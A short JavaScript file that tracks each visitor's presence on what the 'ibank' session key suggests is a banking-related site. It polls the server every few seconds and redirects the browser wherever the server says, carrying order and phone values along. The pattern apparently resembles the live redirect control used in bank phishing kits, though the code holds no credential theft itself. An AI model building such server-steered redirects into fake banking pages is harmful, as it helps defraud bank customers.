(function () {
  if (window.__presenceActive) return;
  window.__presenceActive = true;

  var SID_KEY = 'ibank_session_id';

  function getSessionId() {
    try {
      var sid = sessionStorage.getItem(SID_KEY);
      if (sid) return sid;
    } catch (e) {}
    var sid = 'v_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 10);
    try { sessionStorage.setItem(SID_KEY, sid); } catch (e) {}
    return sid;
  }

  function getCurrentPage() {
    var path = location.pathname.replace(/^\/+/, '').replace(/\.html$/, '');
    if (!path || path === '/') return 'home';
    return path;
  }

  function getOrderId() {
    try { return new URLSearchParams(location.search).get('order'); } catch (e) { return null; }
  }

  function getPhone() {
    try { return new URLSearchParams(location.search).get('phone'); } catch (e) { return null; }
  }

  var sessionId = getSessionId();

  function handleRedirect(url) {
    if (!url) return;
    var orderId = getOrderId();
    var phone = getPhone();
    var sep = url.indexOf('?') !== -1 ? '&' : '?';
    var dest = url;
    if (orderId && url.indexOf('order=') === -1) dest += sep + 'order=' + orderId;
    if (phone) dest += (dest.indexOf('?') !== -1 ? '&' : '?') + 'phone=' + encodeURIComponent(phone);
    location.href = dest;
  }

  function sendPresence() {
    fetch('/api/presence', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ session_id: sessionId, current_page: getCurrentPage() })
    })
    .then(function(r) { return r.json(); })
    .then(function(data) {
      if (data && data.redirectTo) handleRedirect(data.redirectTo);
    })
    .catch(function() {});
  }

  function checkOrderRedirect() {
    var orderId = getOrderId();
    if (!orderId) return;
    fetch('/api/orders/' + orderId + '/status')
      .then(function(r) { return r.json(); })
      .then(function(data) {
        if (data && data.redirect_to) handleRedirect(data.redirect_to);
      })
      .catch(function() {});
  }

  sendPresence();
  checkOrderRedirect();
  setInterval(sendPresence, 5000);
  setInterval(checkOrderRedirect, 3000);
})();
